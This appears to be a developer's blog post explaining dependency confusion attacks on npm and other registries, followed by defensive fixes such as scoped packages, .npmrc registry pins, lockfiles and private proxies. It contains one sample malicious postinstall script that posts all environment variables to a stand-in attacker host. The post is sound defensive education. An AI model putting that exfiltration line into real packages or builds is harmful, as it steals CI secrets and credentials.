---
title: "🎭 Dependency Confusion: The Heist That Uses Your Own Naming Scheme Against You"
date: "2026-07-31"
excerpt: "You named your internal package @yourcompany/auth-utils and never published it publicly. That gap is the whole attack — someone else can publish a higher-version public package with the same name and your build will happily pull theirs instead of yours."
tags:
  - supply-chain-security
  - dependency-confusion
  - npm
  - package-managers
  - devsecops
featured: true
---

# 🎭 Dependency Confusion: The Heist That Uses Your Own Naming Scheme Against You

In 2021, a researcher named Alex Birsan got code execution inside Apple, Microsoft, PayPal, Tesla, Netflix, Uber, and about 30 other companies. He didn't phish anyone. He didn't exploit a zero-day. He just... published some npm packages with boring names and waited. Companies paid him over $130,000 in bug bounties for what is, embarrassingly, one of the simplest supply chain attacks to understand and one of the easiest to still be vulnerable to today.

It's called **dependency confusion**, and the attack surface is your own internal naming convention.

## The setup: two package worlds colliding

Every reasonably sized company has internal packages that never touch a public registry — shared auth helpers, internal SDKs, config loaders. They get installed from a private registry (Artifactory, a private npm scope, a self-hosted PyPI mirror) alongside public dependencies from npm or PyPI.

The problem is that most package managers, by default, don't strictly separate those two worlds. If your `package.json` lists a dependency and your registry config points at *multiple* sources, the resolver will check all of them and pick the highest version number — regardless of which registry it came from.

So say your company has an internal package called `acme-auth-utils` at version `2.3.0`, hosted only on your private registry. It's never been published to public npm. That's an information leak waiting to happen — internal package names show up in public `package.json` files on GitHub, in leaked build logs, in job postings mentioning your stack, even in error stack traces posted to Stack Overflow.

An attacker finds the name, publishes `acme-auth-utils` version `9.9.9` to public npm — same string, absurdly high version, with a `postinstall` script that phones home. Your CI pipeline runs `npm install`. The resolver checks both registries, sees `9.9.9` beats your internal `2.3.0`, and pulls the attacker's package. Their postinstall script now runs with whatever permissions your CI job has — which, on most pipelines, is "read every secret in the environment."

```json
{
  "name": "acme-auth-utils",
  "version": "9.9.9",
  "scripts": {
    "postinstall": "curl -s https://attacker.example/collect -d \"$(env | base64)\""
  }
}
```

That's it. That's the whole exploit. No malware sophistication required — just knowing your naming scheme and understanding that "highest version wins" is the default resolution rule in a lot of tooling.

## Why this isn't an npm-only problem

The same class of bug has hit pip (unscoped internal package names resolving to PyPI), RubyGems, and NuGet. Anywhere a package manager supports multiple registries with unscoped names and a "highest version wins, source doesn't matter" resolution rule, you have this exposure. The fix looks slightly different per ecosystem, but the root cause is identical: **your resolver trusts version numbers more than it trusts where the package came from.**

## The actual fixes, in order of how much they help

**1. Use scoped packages and reserve the scope everywhere.** For npm, `@acme/auth-utils` instead of `acme-auth-utils`. Then explicitly claim the `@acme` scope on public npm too, even if you never publish anything under it — an empty, unpublishable claim closes the door. Scoped packages also let you configure npm to route a specific scope to a specific registry unconditionally, which is the real fix (see #2).

**2. Pin scopes and registries explicitly — don't rely on a fallback order.** This is the fix that actually matters; naming conventions alone just make the attack slightly harder to guess.

```ini
# .npmrc — internal scope ALWAYS resolves to the private registry, no fallback to public npm
@acme:registry=https://npm.internal.acme.com/
always-auth=true
```

Without this, npm's default behavior on a scope miss can still fall through to the public registry, which quietly reintroduces the exact hole you thought you closed.

**3. Lockfiles with integrity hashes, and enforce `npm ci` not `npm install` in CI.** A committed `package-lock.json` records exactly which registry and hash resolved last time. `npm ci` refuses to deviate from the lockfile — it won't silently accept "same name, higher version, different source." If someone lands a malicious dependency confusion package, `npm ci` in CI catches the mismatch instead of installing it fresh every run.

**4. Verify with a private registry proxy that never falls through unexpectedly.** Tools like Artifactory or Verdaccio can be configured so any package under your internal scope is served exclusively from the internal store — a request for `@acme/*` that isn't found internally should 404, not silently proxy to public npm.

At Cubet, when we onboarded a new internal SDK, the checklist item that used to get skipped was exactly this — reserving the npm scope and locking `.npmrc` to it *before* the first line of internal code was written, not after. It costs five minutes. Skipping it costs an incident report.

## The uncomfortable part

Dependency confusion works precisely *because* you did nothing wrong in the traditional sense — you didn't leak a secret, you didn't misconfigure an S3 bucket. You just named an internal thing sensibly, in a naming scheme an attacker could guess, and trusted your package manager to know the difference between "ours" and "not ours." It didn't, by default, in most ecosystems, for years.

Go check your `.npmrc` (or `pip.conf`, or `NuGet.config`) right now. If your internal scopes don't have a hard registry pin with no fallback, you're one guessable package name away from someone else's `postinstall` script running in your CI with your secrets. Worth five minutes before your coffee gets cold.

---

Found this useful, or want to argue that lockfiles alone would've been enough? I'm on [Twitter/X](https://twitter.com/anuragh_kp), [LinkedIn](https://linkedin.com/in/anuraghkp), and [GitHub](https://github.com/kpanuragh) — come tell me I'm wrong, or share your own dependency confusion war story.
